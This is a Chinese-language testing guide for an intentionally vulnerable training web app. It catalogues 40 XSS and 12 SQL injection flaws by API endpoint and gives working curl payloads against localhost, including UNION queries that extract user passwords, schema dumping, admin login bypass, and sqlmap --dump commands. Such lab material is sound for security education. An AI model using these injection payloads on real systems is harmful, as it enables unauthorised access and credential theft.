# 漏洞测试指南

本系统是一个用于安全测试的Web应用，包含多种类型的安全漏洞，用于教育培训和漏洞扫描工具验证。

## 🔐 安全警告

⚠️ **本系统仅用于授权的安全测试环境，切勿部署到生产环境！**

## 📋 漏洞概览

### XSS漏洞 (40个)
详见 [XSS_VULNERABILITIES.md](./XSS_VULNERABILITIES.md) 和 [EXPLOITS.md](./EXPLOITS.md)

- **存储型XSS**: 留言板、新闻发布、用户资料等
- **反射型XSS**: 搜索功能、API参数等
- **DOM型XSS**: 客户端JS处理URL参数等

### SQL注入漏洞 (12个)
详见 [SQL_INJECTIONS.md](./SQL_INJECTIONS.md)

这些漏洞隐藏在正常的业务功能中：

1. **新闻详情查询** (`GET /api/news/:id`) - 整数型注入
2. **新闻分类筛选** (`GET /api/news/category/:category`) - 字符串型注入
3. **产品详情查询** (`GET /api/products/:id`) - Error-based注入
4. **产品搜索** (`GET /api/products/search`) - UNION注入
5. **产品库存更新** (`PUT /api/products/:id/stock`) - UPDATE注入
6. **用户登录** (`POST /api/auth/login`) - Boolean盲注
7. **用户注册** (`POST /api/auth/register`) - INSERT注入
8. **用户名检查** (`GET /api/auth/check-username/:username`) - Time-based盲注
9. **用户订单查询** (`GET /api/orders/user/:userId`) - JOIN注入
10. **订单列表排序** (`GET /api/orders`) - ORDER BY注入
11. **订单删除** (`DELETE /api/orders/:id`) - DELETE注入
12. **用户搜索** (`GET /api/users/search`) - LIKE注入

## 🎯 如何测试

### 1. 启动应用

```bash
docker-compose up --build
```

应用将在以下地址运行：
- 前端: http://localhost:3000
- 后端API: http://localhost:3001

### 2. 浏览Web界面

访问各个功能页面，观察数据流动和交互：

- **首页** - 新闻列表
- **商城** - 产品浏览和搜索
- **订单** - 订单管理
- **用户** - 用户列表和搜索
- **登录/注册** - 用户认证
- **留言板** - 用户留言
- **个人中心** - 用户资料

### 3. 手动测试SQL注入

#### 示例1: 新闻详情整数型注入
```bash
# 正常查询
curl http://localhost:3001/api/news/1

# 获取所有新闻
curl "http://localhost:3001/api/news/1 OR 1=1--"

# 查询用户凭证
curl "http://localhost:3001/api/news/999 UNION SELECT id,username,password,email,role,created_at,NULL,NULL FROM users_db--"
```

#### 示例2: 产品搜索UNION注入
```bash
# 查看数据库表
curl "http://localhost:3001/api/products/search?q=' UNION SELECT 1,name,sql,4,5,6 FROM sqlite_master WHERE type='table'--"

# 提取用户密码
curl "http://localhost:3001/api/products/search?q=' UNION SELECT id,username,password,email,role,created_at FROM users_db--"
```

#### 示例3: 登录绕过
```bash
# 绕过密码验证
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"anything"}'

# 获取admin权限
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR role='\''admin'\''--","password":"x"}'
```

### 4. 使用自动化工具

#### SQLMap
```bash
# 扫描新闻详情端点
sqlmap -u "http://localhost:3001/api/news/1" --batch --dump

# 扫描登录端点
sqlmap -u "http://localhost:3001/api/auth/login" \
  --data='{"username":"admin","password":"pass"}' \
  --method=POST \
  --content-type="application/json" \
  --batch
```

#### Burp Suite
1. 配置浏览器代理到Burp Suite (127.0.0.1:8080)
2. 访问应用并浏览各个功能
3. 在Burp中查看HTTP请求
4. 使用Intruder或Scanner进行自动化测试

#### OWASP ZAP
1. 启动ZAP并配置为代理
2. 浏览应用并记录流量
3. 运行主动扫描或被动扫描
4. 查看发现的漏洞

## 💾 数据库信息

### 测试账户
- 管理员: `admin` / `admin123`
- 编辑: `editor` / `editor456`
- 用户1: `user1` / `pass123`
- 用户2: `user2` / `pass456`

### 数据库表
- **news** - 5条新闻记录
- **users_db** - 5个用户账户
- **products** - 5个产品
- **orders** - 4条订单记录
- **logs** - 3条日志记录

### 数据库文件
位置: `backend/data/news.db`

重置数据库:
```bash
docker-compose down
rm -rf backend/data/news.db
docker-compose up --build
```

## 📚 文档说明

- **README.md** - 项目总览和快速开始
- **XSS_VULNERABILITIES.md** - XSS漏洞详细说明
- **EXPLOITS.md** - XSS漏洞利用方法
- **SQL_INJECTIONS.md** - SQL注入漏洞分析报告
- **VULNERABILITIES_GUIDE.md** - 本文档，测试指南

## 🔧 漏洞开关

通过修改 `docker-compose.yml` 中的环境变量控制漏洞开关：

```yaml
environment:
  - VULNERABILITIES_ENABLED=true  # 启用漏洞（默认）
  # - VULNERABILITIES_ENABLED=false  # 禁用漏洞
```

**注意**: 目前漏洞开关只影响XSS漏洞，SQL注入漏洞始终存在。

## 🎓 学习资源

### SQL注入
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

### XSS
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)

### Web安全
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Security Academy](https://portswigger.net/web-security)

## ⚖️ 法律声明

**本系统仅用于以下合法目的**:
- 安全教育和培训
- 授权的渗透测试
- 安全工具开发和验证
- 学术研究

**禁止用于**:
- 未经授权的系统测试
- 恶意攻击
- 非法访问他人系统
- 任何违法活动

使用本系统进行测试造成的任何法律后果由使用者自行承担。

## 📞 支持

如有问题或建议，请查看文档或提交Issue。

---

**最后更新**: 2025-11-25


